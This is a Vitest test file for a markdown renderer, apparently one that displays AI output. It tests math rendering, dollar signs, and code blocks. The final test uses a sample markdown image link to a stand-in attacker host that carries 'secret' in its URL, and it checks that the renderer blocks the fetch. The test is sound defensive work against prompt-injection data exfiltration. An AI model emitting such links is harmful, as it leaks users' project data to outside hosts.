import { describe, expect, it, vi } from 'vitest';
import { render } from '@testing-library/react';

vi.mock('./project-images', () => ({ useProjectImageUrls: () => ({}) }));

import { MarkdownOutput } from './markdown-output';

describe('maths and code as a physicist reads them (M1; Sean, 7 Oct)', () => {
  it('draws equations with KaTeX and keeps their LaTeX to copy', () => {
    const { container, getByText } = render(
      <MarkdownOutput content={'The energy is \\(E = \\frac{1}{2} m v^2\\), and\n\n\\[ \\omega_0 = \\sqrt{k/m} \\]\n'} />
    );
    expect(container.querySelectorAll('.katex').length).toBeGreaterThanOrEqual(2);
    // What is drawn has no commands showing; the source stays in KaTeX's hidden MathML.
    for (const html of container.querySelectorAll('.katex-html')) expect(html.textContent).not.toContain('\\frac');
    expect(container.querySelector('[data-math-display]')).not.toBeNull();
    expect(getByText('Copy LaTeX')).toBeTruthy();
  });

  it('leaves money as money', () => {
    const { container } = render(<MarkdownOutput content={'B + D + E costs $10,000; A + B costs $8,000 and $9,000.'} />);
    expect(container.querySelector('.katex')).toBeNull();
    expect(container.textContent).toContain('$8,000 and $9,000');
  });

  it('shows code with its language, indentation intact, and Copy / Download', () => {
    const code = 'def f(x):\n    if x:\n        return [x]\n    return []';
    const { container, getByText } = render(<MarkdownOutput content={'```python\n' + code + '\n```'} />);
    expect(getByText('python')).toBeTruthy();
    expect(getByText('Copy')).toBeTruthy();
    expect(getByText('Download')).toBeTruthy();
    expect(container.querySelector('pre')?.textContent).toBe(code + '\n');
  });

  it('a language highlight.js does not know is still shown, not an error', () => {
    const { container } = render(<MarkdownOutput content={'```wolfram-ish\nx := 1\n```'} />);
    expect(container.querySelector('pre')?.textContent).toContain('x := 1');
  });
});

describe('images (the client\'s call, 4 Nov: mail is about to reach prompts)', () => {
  it('never fetches one from another address, which could carry the project out in its URL', () => {
    const { container } = render(<MarkdownOutput content={'![the plan](https://attacker.example/x.png?d=secret)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[data-image-not-loaded]')?.textContent).toContain('the plan');
    expect(container.textContent).not.toContain('attacker.example');
  });
});

